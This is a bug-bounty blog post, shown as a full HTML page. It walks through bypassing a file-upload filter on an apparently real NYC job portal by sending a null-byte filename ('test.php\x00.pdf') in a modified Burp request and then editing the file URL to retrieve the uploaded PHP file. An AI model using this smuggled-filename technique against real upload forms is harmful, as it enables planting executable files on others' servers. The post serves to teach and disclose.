<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Null-Byte File Upload Bypass: PoC on a NYC Portal</title>

    <!-- Favicon links -->
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon_io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon_io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon_io/favicon-16x16.png">
    <link rel="manifest" href="/favicon_io/site.webmanifest">

    <!-- Toast UI Editor CSS -->
    <link rel="stylesheet" href="https://uicdn.toast.com/editor/latest/toastui-editor.min.css" />

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.5/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous" />

    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet" />

    <!-- Your custom CSS (adjust path as needed) -->
    <link rel="stylesheet" href="/assets/style.css" />

    <!-- GitHub Markdown CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/5.1.0/github-markdown.min.css" />
    <link rel="stylesheet" href="/assets/style.css" />

    <!-- Terminal styles -->

    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">

    
    <style>
      body {
        overflow-x: hidden;
      }

      #leaf-container {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        overflow: hidden;
        z-index: 9999;
      }

      /* Zoomable image styles */
      .zoomable-img {
        transition: transform 0.3s ease;
        cursor: pointer;
      }

      .zoomable-img.zoomed {
        transform: scale(2);
        z-index: 10000;
      }

      /* Optional: Style for body when zoomed */
      .zoom-active {
        overflow: hidden;
      }
    </style>
  </head>
  <body class="">

    <nav class="navbar navbar-expand-lg navbar-dark navbar-custom">
  <div class="container-fluid">
    <a class="navbar-brand" href="/">
      <i class="bi bi-briefcase-fill" style="color:white; margin-right: 8px;"></i> Portfolio
    </a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbar">
      <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
        <li class="nav-item">
          <a class="nav-link " href="/">
            <i class="bi bi-house-door-fill"></i> Home
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link " href="/posts">
            <i class="bi bi-journal-text"></i> Blog
          </a>
        </li>
        <li class="nav-item">
          <a class="nav-link " href="/certificates">
            <i class="bi bi-award-fill"></i> Certificates
          </a>
        </li>
      </ul>
    </div>
  </div>
</nav>


    <!-- Falling leaves animation container -->
    <div id="leaf-container"></div>

    <main class="container py-5">
      
<!-- Normal post view -->
<div class="post-page">
  <article class="post-container px-4 py-5 mx-auto max-w-4xl text-gray-100">
    <header class="mb-4 border-b border-gray-600 pb-3">
      <h1 class="text-3xl font-bold text-white">Null-Byte File Upload Bypass: PoC on a NYC Portal</h1>
      
      <p class="text-sm text-gray-400">
        August 29, 2025
      </p>

      
        <div class="categories mt-3 mb-2">
          <span class="text-gray-400 text-sm font-medium">Categories: </span>
          
            <span class="inline-block bg-gradient-to-r from-blue-600 to-blue-500 text-white px-3 py-1 rounded-full text-xs font-medium mr-2 mb-1 hover:from-blue-500 hover:to-blue-400 transition-all duration-200 shadow-sm">
              Bug-bounty
            </span>
          
        </div>
      
    </header>

    
      <div class="post-header-image">
        <img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dIWSWrtC08kIaoVTLITp5w.jpeg" alt="Null-Byte File Upload Bypass: PoC on a NYC Portal cover image" />
      </div>
    

    <section class="post-content prose prose-invert max-w-none text-gray-300">
      <p>While searching for jobs on a New York City job portal, I decided to create an account and explore the platform’s features. One of the first things I did was update my profile and upload my resume, just like any typical job seeker would. The profile page looked something like this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*LfMseQB6u9eC7ER5irMVAA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>As I interacted with the site, I started to notice some interesting behaviors in the file upload functionality…</p>

<p>As I interacted with the site, I started to notice some interesting behaviors in the file upload functionality. The platform only allowed certain file types specifically PDF and TXT files. Any attempt to upload other or potentially malicious files was blocked.</p>

<p>When uploading a file, you would see a request similar to this:</p>

<div class="code-block-container">
  <span class="code-lang-tag">burp suite request</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
POST /upload HTTP/1.1
Host: localhost:5000
Content-Length: 49871
Cache-Control: max-age=0
Origin: http://localhost:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvqrfq0aFgpBXXzTT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:5000/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aLHqhg.2zjRjDid41OHk7Nrgl1dXJZ8n70
Connection: keep-alive

------WebKitFormBoundaryvqrfq0aFgpBXXzTT
Content-Disposition: form-data; name="file"; filename="rest.pdf"
Content-Type: application/pdf

%PDF-1.3
%Äåòåë§ó ÐÄÆ
4 0 obj
&lt;&lt; /Length 5 0 R /Filter /FlateDecode &gt;&gt;
stream.....
</code></pre>
</div>

<p>However, if we modify the upload request and change the filename to include a null byte (for example, <code class="language-plaintext highlighter-rouge">test.php\x00.pdf</code>) and set the <code class="language-plaintext highlighter-rouge">Content-Type</code> to something like <code class="language-plaintext highlighter-rouge">application/vnd.microsoft.portable-executable</code>, the server processes the file as <code class="language-plaintext highlighter-rouge">test.php\x00.pdf</code>. This could potentially allow us to bypass the file type restrictions.</p>

<p>Here’s how the modified request would look:</p>

<div class="code-block-container">
  <span class="code-lang-tag">burp suite request (null byte bypass)</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-javascript">
POST /upload HTTP/1.1
Host: localhost:5000
Content-Length: 49871
Cache-Control: max-age=0
Origin: http://localhost:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvqrfq0aFgpBXXzTT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:5000/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aLHqhg.2zjRjDid41OHk7Nrgl1dXJZ8n70
Connection: keep-alive

------WebKitFormBoundaryvqrfq0aFgpBXXzTT
Content-Disposition: form-data; name="file"; filename="test.php\x00.pdf"
Content-Type: application/vnd.microsoft.portable-executable

&lt;--MZ binary content--&gt;
------WebKitFormBoundaryvqrfq0aFgpBXXzTT--
</code></pre>
</div>

<p>This trick can sometimes bypass weak file validation mechanisms, potentially allowing the upload of executable or malicious files.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*4sE7RSkRelC-XNJeqqNgBg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now, when you try to access the uploaded file, the application returns a “Page Not Found” error, and the URL looks like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:5000/file/filename.php/x00
</code></pre></div></div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*yPJ1-vbmpXkK2wkQYowPtA.png" alt="Null byte file download demo" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>However, if you manually remove the <code class="language-plaintext highlighter-rouge">/x00</code> from the URL so it becomes:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:5000/file/filename.php
</code></pre></div></div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*FUQ2f6XnHFX7cxqhFNDRFg.png" alt="Null byte file download demo" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>you are able to download the uploaded PHP file directly.</p>

<p>Below is a demonstration of replicating this vulnerability on a test environment (not the NYC job portal), but the screenshots above are from the real site:</p>

<h2 id="video-demonstration">Video Demonstration</h2>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/p3waRC1e7jo" frameborder="0" allowfullscreen="" style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

<p><strong>Thank you for reading!</strong> If you found this post helpful or interesting, stay tuned for more cybersecurity stories and insights. See you</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*TEgAP1FqQNaH7JkeQaumFw.jpeg" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

    </section>

    <footer class="mt-8 text-sm text-gray-400">
      <a href="/posts" class="hover:text-white">← Back to blog</a>
    </footer>
  </article>
</div>



      
        
          <!-- Giscus comments - Only show for unlocked posts -->
          <div id="comments"></div>
          <script src="https://giscus.app/client.js"
                  data-repo="tobiasGuta/tobiasGuta.github.io"
                  data-repo-id="R_kgDOOxswYQ"
                  data-category="General"
                  data-category-id="DIC_kwDOOxswYc4CrEhp"
                  data-mapping="pathname"
                  data-strict="0"
                  data-reactions-enabled="1"
                  data-emit-metadata="0"
                  data-input-position="bottom"
                  data-theme="transparent_dark"
                  data-lang="en"
                  data-loading="lazy"
                  crossorigin="anonymous"
                  async>
          </script>
        
      
    </main>

    

    <!-- Bootstrap JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.5/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>

    <!-- Typing animation script -->
    <script>
      const text = "I’m a cybersecurity student and bug bounty hunter focused on penetration testing, web exploitation, and offensive security. Passionate about AI’s role in threat detection, I thrive on solving complex security challenges and staying ahead of emerging threats. I'm actively seeking internships, research roles, and opportunities to grow within the cybersecurity community.";
      const typedText = document.getElementById("typed-text");
      const cursor = document.getElementById("cursor");
      let i = 0;

      function type() {
        if (i < text.length) {
          typedText.textContent += text.charAt(i);
          i++;
          setTimeout(type, 25);
        }
      }

      document.addEventListener("DOMContentLoaded", type);
    </script>

    <!-- Copy code button script -->
    <script>
      function copyCode(button) {
        const codeBlock = button.parentElement.querySelector('pre code');
        const text = codeBlock.textContent;
        
        navigator.clipboard.writeText(text).then(() => {
          // Store original content
          const originalHTML = button.innerHTML;
          
          // Add copied class for styling
          button.classList.add('copied');
          
          // Change to checkmark icon
          button.innerHTML = `
            <svg class="checkmark-icon" viewBox="0 0 24 24">
              <polyline points="20,6 9,17 4,12"></polyline>
            </svg>
          `;
          
          // Reset after 1.5 seconds
          setTimeout(() => {
            button.classList.remove('copied');
            button.innerHTML = originalHTML;
          }, 1500);
        }).catch(err => {
          console.error('Failed to copy: ', err);
          // Show error state
          const originalHTML = button.innerHTML;
          button.style.background = '#ef4444';
          button.innerHTML = '✗';
          setTimeout(() => {
            button.innerHTML = originalHTML;
            button.style.background = '';
          }, 1000);
        });
      }
    </script>

    

    

<script>
document.addEventListener('DOMContentLoaded', function() {
  document.querySelectorAll('.zoomable-img').forEach(function(img) {
    img.addEventListener('click', function(e) {
      e.stopPropagation(); // Prevent bubbling
      if (img.classList.contains('zoomed')) {
        img.classList.remove('zoomed');
        document.body.classList.remove('zoom-active');
        if (document.fullscreenElement) {
          document.exitFullscreen();
        }
      } else {
        document.querySelectorAll('.zoomable-img.zoomed').forEach(function(other) {
          other.classList.remove('zoomed');
        });
        img.classList.add('zoomed');
        document.body.classList.add('zoom-active');

        // Try to go fullscreen
        if (img.requestFullscreen) {
          img.requestFullscreen().catch(err => {
            console.error(`Error attempting to enable fullscreen mode: ${err.message}`);
          });
        } else if (img.webkitRequestFullscreen) { // Safari
          img.webkitRequestFullscreen();
        } else if (img.msRequestFullscreen) { // IE11
          img.msRequestFullscreen();
        }
      }
    });
  });

  document.addEventListener('click', function(e) {
    document.querySelectorAll('.zoomable-img.zoomed').forEach(function(img) {
      img.classList.remove('zoomed');
    });
    document.body.classList.remove('zoom-active');
    if (document.fullscreenElement) {
      document.exitFullscreen();
    }
  });

  // Escape key exits zoom
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
      document.querySelectorAll('.zoomable-img.zoomed').forEach(function(img) {
        img.classList.remove('zoomed');
      });
      document.body.classList.remove('zoom-active');
      if (document.fullscreenElement) {
        document.exitFullscreen();
      }
    }
  });
});
</script>
    
  </body>
</html>
